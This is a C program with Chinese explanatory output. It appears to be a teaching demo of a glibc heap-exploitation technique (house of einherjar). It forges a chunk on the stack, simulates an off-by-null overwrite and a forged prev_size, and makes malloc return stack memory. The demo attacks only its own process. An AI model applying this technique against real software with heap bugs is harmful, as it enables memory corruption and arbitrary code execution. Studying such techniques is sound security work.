#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    uint8_t* a;
    uint8_t* b;
    uint8_t* d;

    printf("\n申请 0x38 作为 chunk a\n");
    a = (uint8_t*) malloc(0x38);
    printf("chunk a 在: %p\n", a);
   
    int real_a_size = malloc_usable_size(a);
    printf("malloc_usable_size()可以返回指针所指向的 chunk 不包含头部的大小，chunk a 的 size: %#x\n", real_a_size);

    // create a fake chunk
    printf("\n接下来在栈上伪造 chunk，并且设置 fd、bk、fd_nextsize、bk_nextsize 来绕过 unlink 的检查\n");

    size_t fake_chunk[6];

    fake_chunk[0] = 0x100; // prev_size 必须要等于 fake_chunk 的 size 才能绕过 P->bk->size == P->prev_size
    fake_chunk[1] = 0x100; // size 只要能够整理到 small bin 中就可以了
    fake_chunk[2] = (size_t) fake_chunk; // fd
    fake_chunk[3] = (size_t) fake_chunk; // bk
    fake_chunk[4] = (size_t) fake_chunk; //fd_nextsize
    fake_chunk[5] = (size_t) fake_chunk; //bk_nextsize
    printf("我们伪造的 fake chunk 在 %p\n", fake_chunk);
    printf("prev_size (not used): %#lx\n", fake_chunk[0]);
    printf("size: %#lx\n", fake_chunk[1]);
    printf("fd: %#lx\n", fake_chunk[2]);
    printf("bk: %#lx\n", fake_chunk[3]);
    printf("fd_nextsize: %#lx\n", fake_chunk[4]);
    printf("bk_nextsize: %#lx\n", fake_chunk[5]);

    b = (uint8_t*) malloc(0xf8);
    int real_b_size = malloc_usable_size(b);
    printf("\n再去申请 0xf8 chunk b.\n");
    printf("chunk b 在: %p\n", b);

    uint64_t* b_size_ptr = (uint64_t*)(b - 8);
    printf("\nb 的 size: %#lx\n", *b_size_ptr);
    printf("b 的 大小是: 0x100，prev_inuse 有个 1，所以显示 0x101\n");
    printf("假设有个 off by null 的漏洞，可以通过编辑 a 的时候把 b 的 prev_inuse 改成 0\n");
    a[real_a_size] = 0;
    printf("b 现在的 size: %#lx\n", *b_size_ptr);

    printf("\n我们伪造一个 prev_size 写到 a 的最后 %lu 个字节，以便 chunk b 与我们的 fake chunk 的合并\n", sizeof(size_t));
    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
    printf("\n我们伪造的 prev_size 将会是 chunk b 的带 chunk 头的地址 %p - fake_chunk 的地址 %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
    *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;

    printf("\n接下来要把 fake chunk 的 size 改掉，来通过 size(P) == prev_size(next_chunk(P)) 检查\n");
    fake_chunk[1] = fake_size;

    printf("\nfree b，首先会跟 top chunk 合并，然后因为 b 的 prev_size 是 0，所以会跟前面的 fake chunk 合并，glibc 寻找空闲块的方法是 chunk_at_offset(p, -((long) prevsize))，这样算的话 b+fake_prev_size 得到 fake chunk 的地址，然后合并到 top chunk，新的 topchunk 的起点就是 fake chunk，再次申请就会从 top chunk 那里申请\n");
    free(b);
    printf("现在 fake chunk 的 size 是 %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);

    printf("\n现在如果去 malloc，他就会申请到伪造的那个 chunk\n");
    d = malloc(0x200);
    printf("malloc(0x200) 在 %p\n", d);
}